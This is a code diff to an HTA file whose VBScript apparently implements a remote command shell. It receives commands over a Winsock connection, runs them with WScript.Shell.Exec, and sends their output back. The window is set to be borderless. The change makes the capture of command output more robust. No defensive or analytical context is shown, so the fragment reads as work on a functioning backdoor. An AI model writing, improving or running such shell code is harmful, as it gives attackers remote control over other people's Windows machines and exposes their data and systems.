@@ -2,7 +2,7 @@
 <head>
     <hta:application id="app" border="none" />
     <script language="VBScript">
-        Dim ws, conn, cmd, result
+        Dim ws, conn, cmd, result, exec
         Set ws = CreateObject("WScript.Shell")
         Set conn = CreateObject("MSWinsock.Winsock")
 
@@ -16,7 +16,13 @@
             Else
                 On Error Resume Next
                 Set exec = ws.Exec(cmd)
-                result = exec.StdOut.ReadAll() & exec.StdErr.ReadAll()
+                result = ""
+                If Not exec.StdOut.AtEndOfStream Then
+                    result = exec.StdOut.ReadAll()
+                End If
+                If Not exec.StdErr.AtEndOfStream Then
+                    result = result & exec.StdErr.ReadAll()
+                End If
                 conn.SendData result
             End If
         End Sub
